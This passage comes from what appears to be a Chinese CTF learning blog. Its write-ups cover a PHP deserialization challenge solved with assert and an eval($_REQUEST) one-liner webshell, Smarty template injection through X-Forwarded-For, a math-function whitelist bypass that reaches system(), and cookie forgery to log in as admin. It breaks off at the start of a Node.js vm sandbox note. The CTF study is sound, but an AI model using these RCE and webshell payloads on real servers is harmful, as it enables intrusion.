class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;eval&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不过没有运行？后面换了其它的命令也是没有回显。感觉是被过滤了(可以执行命令的函数有很多)，但也想不到其它思路，去看了其它师傅的wp发现要用<code>assert</code>这个函数，正好借这个机会梳理一下<code>RCE</code>中常用的几个命令执行函数，还有他们之间的关系：</p><p>我个人认为最常见的肯定是<code>eval</code>和<code>system</code>，先说下它俩之间最大的差别(个人观点)：</p><p><strong>eval类型函数是代码执行而不是命令执行</strong></p><p><strong>system类型函数是命令执行而不是代码执行</strong>，举几个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);    <span class="hljs-comment">//2,注意末尾的分号</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo 1+1;&quot;</span>);  <span class="hljs-comment">//1+1;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$num</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a = <span class="hljs-subst">$num</span>;&quot;</span>);   <span class="hljs-comment">//只有这个并无任何回显，可通过echo或var_dump获得回显</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;\$b = <span class="hljs-subst">$num</span>;&quot;</span>);   <br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//显示1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//显示NULL</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);   <span class="hljs-comment">//phpinfo()被执行</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);  <span class="hljs-comment">//phpinfo()不被执行</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);    <span class="hljs-comment">//whoami命令被执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);      <span class="hljs-comment">//whoami命令不被执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(whoami);&quot;</span>); <span class="hljs-comment">//执行成功，注意和上一条的区别</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//我们也可以把system和eval组合使用</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<span class="hljs-comment">// &quot;system(&#x27;whoami&#x27;);&quot;; 也行，但注意后面的分号一定不能丢掉</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//回显 viper3\rdj</span><br></code></pre></td></tr></table></figure><p>接下来这个<code>echo $b($a)</code>也有点说法，这东西有人叫它<code>变量函数</code>，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;eval(&#x27;phpinfo();&#x27;)&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//回显phpinfo的内容，但是：</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;eval&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//这东西没有任何结果</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    @<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//这段代码也能phpinfo</span><br></code></pre></td></tr></table></figure><p>先说下这个<code>assert</code>函数：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`assert()`函数接受一个表达式作为参数，并对该表达式进行求值。如果表达式为真，则继续执行后续代码；如果表达式为假，则触发一个致命错误，终止脚本的执行。但它也可以执行任意的PHP代码，包括执行命令。这是因为`assert()`函数在执行时会将传入的字符串作为PHP代码进行解析和执行。<br></code></pre></td></tr></table></figure><p>至于为什么不能只单纯用一个<code>eval</code>，原因是PHP中不能以变量函数的形式去调用它：eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用。</p><p>可以上传一个简单的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;eval($_REQUEST[3]);&#x27;</span>;<span class="hljs-comment">//REQUEST方法，传完了用GET、POST、COOKIE都行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先用<code>scandir</code>函数看看根目录底下都有啥东西：</p><p><code>time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=var_dump(scandir(&#39;/&#39;));</code></p><p>注意要用分号结尾！否则不能被执行！用<code>var_dump</code>的原因是这函数会返回数组</p><p><img src="/img/scandir2.png" alt="scandir2"></p><p>有个<code>FIag_!S_it</code>，<code>system</code>被禁了所以用不了<code>cat</code>，尝试<code>file_get_contents</code>直接读，但是假的<code>flag</code>：</p><p><code>echo(file_get_contents(&#39;/FIag_!S_it&#39;));</code></p><p>注意这个<strong>不能</strong>写成：</p><p><code>echo(&quot;file_get_contents(&#39;/FIag_!S_it&#39;)&quot;);</code>，这个命令会显示<code>file_get_contents(&#39;/FIag_!S_it&#39;)</code></p><p><img src="/img/scandir5.png" alt="scandir5"></p><p>用蚁剑连接看看怎么个事：</p><p><code>http://1730f221-b91f-4b8b-b19d-8ce0eb0211e5.node4.buuoj.cn:81/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A&#123;s%3A1%3A%22a%22%3Bs%3A19%3A%22eval(%24_REQUEST[3])%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B&#125;</code></p><p><img src="/img/scandir4.png" alt="scandir4"></p><p><img src="/img/scandir3.png" alt="scandir3"></p><p>没有任何东西，应该是没权限。</p><p>看师傅们的<code>wp</code>都是去<code>phpinfo()</code>找，<code>ctrl+f</code>搜索就行。</p><p><code>payload:time.php?data=O%3A8%3A&quot;HelloPhp&quot;%3A2%3A&#123;s%3A1%3A&quot;a&quot;%3Bs%3A19%3A&quot;eval(%24_REQUEST[3])%3B&quot;%3Bs%3A1%3A&quot;b&quot;%3Bs%3A6%3A&quot;assert&quot;%3B&#125;&amp;3=phpinfo();</code></p><p>再补充下<code>scandir()</code>这个函数：</p><p><code>scandir()</code>函数会接受一个目录路径作为参数，并返回一个数组，包含该目录中的所有文件和子目录的名称。返回的数组中，每个元素表示目录中的一个文件或子目录的名称。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;../WWW&#x27;</span>;<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/scandir1.png" alt="scandir1"></p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>进去发现是个和<code>IP</code>有关的页面，右上角显示了我们的公网<code>IP</code>：</p><p><img src="/img/web11-1.png" alt="web11-1"></p><p>下面甚至有请求包的完整信息：</p><p><img src="/img/web11-2.png" alt="web11-2"></p><p>既然它获取了<code>IP</code>那大概率可以想到<code>XFF</code>伪造，抓包试试看：</p><p><img src="/img/web11-3.png" alt="web11-3"></p><p>确实是这样，但有什么用？这题明显不是利用XFF的SQL注入，想到之前做过一道好像叫<code>cookie is so stable</code>的题，通过模板注入解题，试试看：</p><p><code>X-Forwarded-For:&#123;7*7&#125;</code></p><p><img src="/img/web11-5.png"></p><p>还真是，老规矩先判断是什么类型的，再试试:<code>X-Forwarded-For:a&#123;*comment*&#125;b</code></p><p><img src="/img/wweb11-6.png" alt="wweb11-6"></p><p>应该是<code>Smarty</code>模板，个人认为这个模板最大的特点就是可以直接执行命令，在<code>XFF</code>直接输入：<code>&#123;system(&#39;ls /&#39;)&#125;</code>去找<code>flag</code>，然后直接<code>cat</code>读就行了。</p><p>其实这题底下有行小字提示了：<code>Build With Smarty !</code></p><p><img src="/img/smarty1.png" alt="smarty1"></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>看题目可能跟<code>MD5</code>有关？</p><p>直接给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123; <span class="hljs-comment">//GET传参，c不被定义就高亮源码</span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//后面两个依靠\来转义</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题花了很长时间没解出来，因为一直在想怎么去绕过黑名单和正则匹配去执行命令，后面看了<code>wp</code>才知道要利用给的函数去做，参考了这位师傅的文章<code>https://www.cnblogs.com/20175211lyz/p/11588219.html</code></p><p><code>https://www.anquanke.com/post/id/220813#h3-2</code></p><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>主要是<code>base_convert()</code>函数和<code>dechex</code>函数的使用：</p><p><img src="/img/baseconvert.png" alt="baseconvert"></p><p>可以看到这东西的范围是<code>2-36</code>，正好覆盖了<code>0-9,a-z</code>。<code>dechex</code>函数用于将十进制数转换为十六进制数。它接受一个十进制数作为参数，并返回一个表示相应十六进制数的字符串。</p><p>先看<code>wp</code>怎么写的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2bin将一串16进制数转换为二进制字符串</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span><br></code></pre></td></tr></table></figure><p><code>payload</code>：</p><p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=&lt;command&gt;</code></p><p>因为师傅写的很详细还是很好理解的：先利用<code>base_convert</code>函数转出一个<code>hex2bin</code>，再利用<code>dechex</code>转出一个十六进制字符串，前函后参组合转出<code>_GET</code>.</p><p><code>base_convert</code>遇到<code>36</code>进制时会转换成小写字母，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：a</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(A,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：10，转回去并不存在这个问题。</span><br></code></pre></td></tr></table></figure><p>后面就很好理解了，它会直接<code>eval</code>过滤后的<code>c</code>。执行后<code>c</code>&#x3D;<code>$pi</code>&#x3D;<code>_GET</code>，<code>$$pi</code>&#x3D;<code>$_GET</code>。再利用$_GET{0}($_GET{1})去执行函数就好。即使<code>[]</code>被过滤了仍可以使用<code>&#123;&#125;</code>绕过。构造完<code>_GET</code>后还需要引入一个变量来作为函数执行, 例如 <code>$a()</code>, 我们用 <code>$pi</code> 以绕过白名单的检测。</p><h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>利用<code>getallheaders</code>去解题：</p><p><code>payload:/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code>注意这个<code>getallheaders的用法</code></p><p>首先为什么是30进制(参考了<code>bfengj</code>师傅的文章)：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Warning<br>由于使用内部的 “double” 或 “<span class="hljs-attribute">float</span>” 类型，<span class="hljs-built_in">base_convert</span>() 的操作可能会导致大数值中的精度丢失。请参见本手册的 浮点数 章节以便获得更多详细信息。<br><br>经过大师父们的测试，<span class="hljs-number">31</span>-<span class="hljs-number">36</span>进制的getallheaders都会出现精度丢失导致不能成功得到getallheaders，<span class="hljs-number">30</span>进制的时候就可以了。<br></code></pre></td></tr></table></figure><p><code>system(getallheaders()&#123;1&#125;)</code>，这个<code>&#123;1&#125;</code>应该是获取包头为<code>1</code>部分的值，我说<code>应该</code>是因为没找到相关文章说这个东西。。大多直接给了<code>payload</code>(估计师傅们觉得这问题没必要说，哈哈)。我自己尝试把<code>1</code>改成别的再改对应包头也能执行命令(我这里改成了<code>333</code>)：</p><p><img src="/img/lovemath1.png" alt="lovemath1"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/img/kookie1.png" alt="kookie1"></p><p>让我们以<code>admin</code>的身份登录，然后提示已经有<code>cookie/monster</code>这两个账户了，选<code>cookie</code>这个用户名再随便输个密码登录一下看看：</p><p><img src="/img/kookie2.png" alt="kookie2"></p><p>可以看到行为&#x2F;用户名&#x2F;密码都是直接以<code>GET</code>方式传过去的(源码也有相应提示)，那我们直接把<code>username</code>后面的东西删掉看看能否登录：</p><p><code>/?action=login&amp;username=cookie</code></p><p>这个登不上去，换<code>monster</code>试试：</p><p><code>/?action=login&amp;username=monster</code></p><p>登录成功：</p><p><img src="/img/kookie4.png" alt="kookie4"></p><p>抓包看看<code>cookie</code>:</p><p><img src="/img/kookie5.png" alt="kookie5"></p><p>发现<code>cookie</code>字段中<code>username=monster</code>，直接改成<code>admin</code>:</p><p><img src="/img/kookie6.png" alt="kookie6"></p><p>应该是新生赛的题目</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识vm沙箱逃逸</title>
    <link href="/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>初学者的学习笔记，没啥含金量。</p><span id="more"></span><hr><h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><p><code>JavaScript</code>和<code>Nodejs</code>之间有什么区别？</p><p>简单说就是<code>JavaScript</code>用于浏览器前端，<code>Nodejs</code>用在后端(服务器)。</p><p>什么是沙箱(<code>sandbox</code>)？</p><p>用于隔离恶意代码的环境，恶意代码即使在沙箱中被执行也没多大危害。</p><p>在<code>Nodejs</code>中，我们可以通过引入<code>vm</code>模块来创建一个“沙箱”，但其实这个<code>vm</code>模块的隔离功能并不完善，还有很多缺陷，因此<code>Node</code>后续升级了<code>vm</code>，也就是现在的<code>vm2</code>沙箱，<code>vm2</code>引用了<code>vm</code>模块的功能，并在其基础上做了一些优化。</p><h3 id="0x02-Node可以把字符串当代码执行"><a href="#0x02-Node可以把字符串当代码执行" class="headerlink" title="0x02 Node可以把字符串当代码执行"></a>0x02 Node可以把字符串当代码执行</h3><p>用一些参考文章中的栗子(在<code>.js</code>所在目录下创建一个<code>age.txt</code>)：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>创建<code>hello,js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = 